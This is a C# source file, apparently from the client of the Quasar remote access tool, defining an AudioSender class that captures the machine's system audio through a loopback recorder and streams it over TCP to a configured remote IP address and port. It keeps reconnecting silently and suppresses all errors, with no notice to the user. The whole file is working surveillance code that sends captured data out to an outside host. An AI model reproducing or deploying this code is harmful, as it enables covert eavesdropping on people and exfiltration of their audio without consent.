using System;

using System.Net.Sockets;
using System.Net;
using System.Threading;
using NAudio.Wave;

namespace Quasar.Client.Audio
{
    public class AudioSender
    {
        public AudioSender(string ipAddress, int port, int sampleRate, int bitDepth, int channels)
        {
            this._endPoint = new IPEndPoint(IPAddress.Parse(ipAddress), port);
            this._sampleRate = sampleRate;
            this._bitDepth = bitDepth;
            this._channels = channels;
            this._stopEvent = new ManualResetEvent(false);
            this._stop = true;
        }

        private void OnRecordingStopped(object sender, StoppedEventArgs e)
        {
            this._stopEvent.Set();
        }

        public void Start()
        {
            if (!this._stop)
            {
                return;
            }
            this._stop = false;
            this._stopEvent.Reset();
            while (!this._stop)
            {
                try
                {
                    this._s = new Socket(SocketType.Stream, ProtocolType.Tcp);
                    this._s.Connect(this._endPoint);
                    this._s.LingerState = new LingerOption(true, 0);
                    this._waveIn = new WasapiLoopbackCapture();
                    this._waveIn.RecordingStopped += this.OnRecordingStopped;
                    this._waveIn.DataAvailable += this.OnAudioCaptured;
                    this._waveIn.WaveFormat = new WaveFormat(this._sampleRate, this._bitDepth, this._channels);
                    this._waveIn.StartRecording();
                    while (!this._stop)
                    {
                        Thread.Sleep(1000);
                    }
                }
                catch (SocketException)
                {
                    Thread.Sleep(1000);
                }
                catch (Exception)
                {
                    Thread.Sleep(100);
                }
            }
        }

        public void Stop()
        {
            if (this._stop)
            {
                return;
            }
            this._stop = true;
            this._waveIn.DataAvailable -= this.OnAudioCaptured;
            this._waveIn.Dispose();
            this._s.Shutdown(SocketShutdown.Both);
            this._s.Close();
            this._stopEvent.WaitOne();
            this._waveIn.RecordingStopped -= this.OnRecordingStopped;
        }

        public void OnAudioCaptured(object sender, WaveInEventArgs e)
        {
            try
            {
                this._s.Send(e.Buffer, e.BytesRecorded, SocketFlags.None);
            }
            catch (Exception)
            {
                this.Stop();
            }
        }

        private WasapiLoopbackCapture _waveIn;

        private Socket _s;

        private volatile bool _stop;

        private IPEndPoint _endPoint;

        private int _sampleRate;

        private int _bitDepth;

        private int _channels;

        private ManualResetEvent _stopEvent;
    }

}
